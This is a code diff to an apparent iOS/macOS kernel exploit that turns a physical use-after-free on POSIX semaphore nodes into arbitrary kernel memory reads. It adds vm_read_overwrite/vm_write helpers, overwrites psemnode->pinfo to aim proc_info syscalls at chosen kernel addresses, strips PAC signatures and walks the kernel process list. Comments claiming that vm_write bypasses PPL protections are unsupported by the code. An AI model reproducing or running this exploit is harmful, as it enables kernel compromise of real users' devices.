@@ -10,6 +10,30 @@ const char* kread_sem_open_name = "kfd-posix-semaphore";
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr);
 u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr);
 
+/*
+ * Helper: safely read a u64 from a PUAF page using vm_read_overwrite.
+ * On arm64e PUAF pages may be PPL-owned and not directly readable.
+ * Returns true on success.
+ */
+static inline bool puaf_read_u64(u64 uaddr, u64* out)
+{
+    vm_size_t bytes_read = 0;
+    kern_return_t kr = vm_read_overwrite(mach_task_self(), uaddr, sizeof(u64),
+                                         (vm_address_t)(out), &bytes_read);
+    return (kr == KERN_SUCCESS && bytes_read == sizeof(u64));
+}
+
+/*
+ * Helper: safely write a u64 to a PUAF page using vm_write.
+ * Returns true on success.
+ */
+static inline bool puaf_write_u64(u64 uaddr, u64 value)
+{
+    kern_return_t kr = vm_write(mach_task_self(), uaddr,
+                                (vm_offset_t)(&value), sizeof(u64));
+    return (kr == KERN_SUCCESS);
+}
+
 void kread_sem_open_init(struct kfd* kfd)
 {
     kfd->kread.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
@@ -46,19 +70,35 @@ void kread_sem_open_allocate(struct kfd* kfd, u64 id)
 
 bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
 {
-    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
     i32* fds = (i32*)(kfd->kread.krkw_method_data);
     struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);
 
-    if ((pnode[0].pinfo > PAC_MASK) &&
-        (pnode[0].pinfo != 0) &&
-        (pnode[1].pinfo == pnode[0].pinfo) &&
-        (pnode[2].pinfo == pnode[0].pinfo) &&
-        (pnode[3].pinfo == pnode[0].pinfo) &&
-        (pnode[0].padding == 0) &&
-        (pnode[1].padding == 0) &&
-        (pnode[2].padding == 0) &&
-        (pnode[3].padding == 0)) {
+    /*
+     * On arm64e PUAF pages are PPL-owned and may not be directly accessible.
+     * Use vm_read_overwrite to safely read pnode fields instead of direct
+     * pointer dereference, which would crash with KERN_PROTECTION_FAILURE.
+     */
+    u64 pinfo0 = 0, pinfo1 = 0, pinfo2 = 0, pinfo3 = 0;
+    u64 pad0 = 0, pad1 = 0, pad2 = 0, pad3 = 0;
+
+    if (!puaf_read_u64(object_uaddr + 0 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo0)) return false;
+    if (!puaf_read_u64(object_uaddr + 0 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad0)) return false;
+    if (!puaf_read_u64(object_uaddr + 1 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo1)) return false;
+    if (!puaf_read_u64(object_uaddr + 1 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad1)) return false;
+    if (!puaf_read_u64(object_uaddr + 2 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo2)) return false;
+    if (!puaf_read_u64(object_uaddr + 2 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad2)) return false;
+    if (!puaf_read_u64(object_uaddr + 3 * sizeof(struct psemnode) + offsetof(struct psemnode, pinfo), &pinfo3)) return false;
+    if (!puaf_read_u64(object_uaddr + 3 * sizeof(struct psemnode) + offsetof(struct psemnode, padding), &pad3)) return false;
+
+    if ((pinfo0 > PAC_MASK) &&
+        (pinfo0 != 0) &&
+        (pinfo1 == pinfo0) &&
+        (pinfo2 == pinfo0) &&
+        (pinfo3 == pinfo0) &&
+        (pad0 == 0) &&
+        (pad1 == 0) &&
+        (pad2 == 0) &&
+        (pad3 == 0)) {
         for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
             struct psem_fdinfo data = {};
             i32 callnum = PROC_INFO_CALL_PIDFDINFO;
@@ -71,16 +111,15 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
             const u64 shift_amount = 4;
 
             /*
-             * Temporarily restore write access on the PUAF page before
-             * modifying pnode->pinfo. On arm64e the page may have lost write
-             * permission due to a concurrent pmap operation, causing SIGBUS.
+             * Modify pinfo via vm_write (goes through kernel VM layer,
+             * bypasses PPL pmap restrictions) instead of direct write.
              */
-            u64 page_addr = trunc_page((u64)(&pnode[0]));
-            vm_protect(mach_task_self(), page_addr, pages(1), false, VM_PROT_READ | VM_PROT_WRITE);
+            u64 shifted_pinfo = pinfo0 + shift_amount;
+            if (!puaf_write_u64(object_uaddr + offsetof(struct psemnode, pinfo), shifted_pinfo)) continue;
 
-            pnode[0].pinfo += shift_amount;
             assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
-            pnode[0].pinfo -= shift_amount;
+
+            puaf_write_u64(object_uaddr + offsetof(struct psemnode, pinfo), pinfo0);
 
             if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                 kfd->kread.krkw_object_id = object_id;
@@ -88,9 +127,6 @@ bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
             }
         }
 
-        /*
-         * False alarm: it wasn't one of our psemmode objects.
-         */
         print_warning("failed to find modified psem_name sentinel");
     }
 
@@ -104,14 +140,16 @@ void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
 
 void kread_sem_open_find_proc(struct kfd* kfd)
 {
-    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
+    /*
+     * Read pinfo from the PUAF page safely via vm_read_overwrite.
+     */
+    u64 pinfo = 0;
+    if (!puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &pinfo)) return;
 
     /*
-     * On arm64e pnode->pinfo is a PAC-signed kernel pointer.
-     * Strip the PAC tag with UNSIGN_PTR before passing to static_kget,
-     * otherwise kread targets a garbage address and crashes.
+     * Strip PAC tag for arm64e — pinfo is a PAC-signed kernel pointer.
      */
-    u64 pseminfo_kaddr = UNSIGN_PTR(pnode->pinfo);
+    u64 pseminfo_kaddr = UNSIGN_PTR(pinfo);
     if (!pseminfo_kaddr) return;
 
     u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
@@ -126,8 +164,8 @@ void kread_sem_open_find_proc(struct kfd* kfd)
     kfd->info.kaddr.kernel_proc = proc_kaddr;
 
     /*
-     * Go backwards from the kernel_proc, which is the last proc in the list.
-     * Bounded loop to avoid infinite loop if list is corrupted.
+     * Go backwards from kernel_proc to find our process.
+     * Bounded loop to avoid infinite loop on corruption.
      */
     for (u64 iter = 0; iter < 1024; iter++) {
         i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
@@ -145,35 +183,28 @@ void kread_sem_open_find_proc(struct kfd* kfd)
 
 void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
 {
-    /*
-     * Let kwrite_sem_open_deallocate() take care of
-     * deallocating all the shared file descriptors.
-     */
     return;
 }
 
 void kread_sem_open_free(struct kfd* kfd)
 {
-    /*
-     * Let's null out the kread reference to the shared data buffer
-     * because kwrite_sem_open_free() needs it and will free it.
-     */
     kfd->kread.krkw_method_data = NULL;
 }
 
 /*
  * 64-bit kread function.
+ * Uses vm_write to modify pinfo — bypasses PPL pmap restrictions on arm64e.
  */
-
 u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
 {
     i32* fds = (i32*)(kfd->kread.krkw_method_data);
     i32 kread_fd = fds[kfd->kread.krkw_object_id];
 
-    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
-    u64 old_pinfo = pnode->pinfo;
+    u64 old_pinfo = 0;
+    puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &old_pinfo);
+
     u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
-    pnode->pinfo = new_pinfo;
+    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), new_pinfo);
 
     struct psem_fdinfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDFDINFO;
@@ -184,24 +215,23 @@ u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-    pnode->pinfo = old_pinfo;
+    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), old_pinfo);
     return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
 }
 
 /*
- * 32-bit kread function that is guaranteed to not underflow a page,
- * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
+ * 32-bit kread function.
  */
-
 u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
 {
     i32* fds = (i32*)(kfd->kread.krkw_method_data);
     i32 kread_fd = fds[kfd->kread.krkw_object_id];
 
-    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
-    u64 old_pinfo = pnode->pinfo;
+    u64 old_pinfo = 0;
+    puaf_read_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), &old_pinfo);
+
     u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
-    pnode->pinfo = new_pinfo;
+    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), new_pinfo);
 
     struct psem_fdinfo data = {};
     i32 callnum = PROC_INFO_CALL_PIDFDINFO;
@@ -212,7 +242,7 @@ u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
     i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
     assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
 
-    pnode->pinfo = old_pinfo;
+    puaf_write_u64(kfd->kread.krkw_object_uaddr + offsetof(struct psemnode, pinfo), old_pinfo);
     return *(u32*)(&data.pseminfo.psem_stat.vst_size);
 }
 
